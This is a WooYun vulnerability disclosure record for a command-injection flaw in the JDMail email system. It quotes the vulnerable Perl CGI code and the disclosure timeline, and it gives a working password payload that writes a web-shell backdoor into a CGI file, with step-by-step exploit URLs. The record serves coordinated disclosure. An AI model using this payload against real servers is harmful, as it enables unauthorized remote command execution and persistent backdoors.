{"id": 45961, "wybug_id": "wooyun-2014-086343", "wybug_title": "金迪电子邮件系统远程命令执行一", "wybug_corp": "mailer.com.cn", "wybug_author": "kk_skipper", "wybug_date": "2014-12-08 12:09", "wybug_open_date": "2015-03-08 12:10", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向公众公开  简要描述： 金笛@电子邮件系统是金笛软件公司历时多年研发的分布式、大容量、高可用电子邮件系统。采用 linux/xml/java等开放技术架构，具有很好的可靠性、扩展性。目前广泛用于各地电子政务网站、金税工程、IDC及各地行业门户网站 详细说明：  测试版本：jdmail3.14.6.1限制条件：允许用户注册漏洞分析：先要注册一个账户，给管理员审核，例如用户名为test,修改域名地址为:用户名随便：testwindows版本，设置密码：1||echo:system($b=$cgi-^>param(a))>>user_verify_disagree.cgi;官网是linux版本，没去验证，本地windows测试成功。漏洞原因：在jdwa/cgi/config.cgi中实现了调用系统函数指令\n## 实行控制指令sub ctrlcmd { \tmy ($cmd,$op1) = @_;\tmy $rep;\tmy $port = $cfg{'ctrlprt'};\t$port = '6017' if !$port;\tmy $admin = &dec_str($cfg{'admin'});\tmy $pass = &dec_str($cfg{'pass'});\tmy $ctrl = \"$cfg{'jdmaildir'}/$ctrlclnt -s localhost -n $port -u \\\"$admin\\\" -p \\\"$pass\\\"\";\t\tif (!$op1){system(\"$ctrl $cmd\");}\telse {$rep = `$ctrl $cmd`;}\t$rep;}\n在user_verify_agree.cgi中作调用使用：\n#!perl.exeif($ENV{'SERVER_SOFTWARE'}=~/IIS.\\d+.0$/){my $cd=$0;$cd=~s/[^\\\\]*$//;chdir($cd);}require \"config.cgi\";use CGI;my $cgi = new CGI;my %users = ();my $number = 0;my $new_user = $cgi -> param(\"checkbox\"); my ($name,$domain,$pass1,$realname,$depart,$question,$answer,$msg);$new_user =~ s/\\s+$//;if (!$new_user || $new_user =~ /^\\s+$/){\tprint \"Content-Type: text/html; charset=utf-8\\n\";\tprint \"CacheControl: no-cache\\nPragma: no-cache\\nExpires: -1\\n\\n\";\tprint qq~\t\t<html>\t\t\t<head>\t\t\t\t<meta http-equiv='content-type' content='text/html; charset=utf-8' />\t\t\t\t<link href=\"../html/css/jdwa.css\" rel=\"stylesheet\" type=\"text/css\" />\t\t\t</head>\t\t\t<body>无新用户申请！</body>\t\t</html>\t\t~;\t}else{\t$new_user =~ s/,\\s*$//g;my @users = split /,/,$new_user;$number = @users; foreach my $user (@users){\tmy @domain_user = split /\\s+/,$user;\t$name = $domain_user[1];\t$domain = $domain_user[0];\t$users{\"$name,$domain\"} = 1;\t\topen NEW,\"../../../../domains/newUserList.tab\" || die \"$!\";\t\twhile (<NEW>)\t{\t\t\tchomp; \t\tif (/^$name\\t$domain\\t.*/){ \t\t\t($name,$domain,$pass1,$realname,$depart,$question,$answer) = split /\\t/,$_;\t\t\t&ctrlcmd(\"useradd\t$domain\t$name\t$pass1\tU\");\t\t\tif (!-d \"$cfg{'mailroot'}/domains/$domain/$name/mailbox\"){\t\t\t\t$msg = \"$name\\@$domain邮箱新建失败！\";\t\t\t}\t\t\t&save_env_cfg();\n上述过程中，未到password进行过滤特殊字符，导致存在命令注入限制条件：不能使用空格方法：写入后门到已有的文件内，不需要空格，用：代替。密码：1||echo:system($b=$cgi-^>param(a))>>user_verify_disagree.cgi;具体测试exp：1.注册一个用户名test123，密码为：1||echo:system($b=$cgi-^>param(a))>>user_verify_disagree.cgi;的用户2.访问http://127.0.0.1/JDWA/cgi/user_verify_agree.cgi?checkbox=mailer.com.cn+test123,提示审核失败3.访问http://127.0.0.1/JDWA/cgi/user_verify_agree.cgi?a=dir访问成功，可以写入目录   漏洞证明：  见详细   修复方案：  无   版权声明：转载请注明来源 kk_skipper@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-12-12 18:02 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}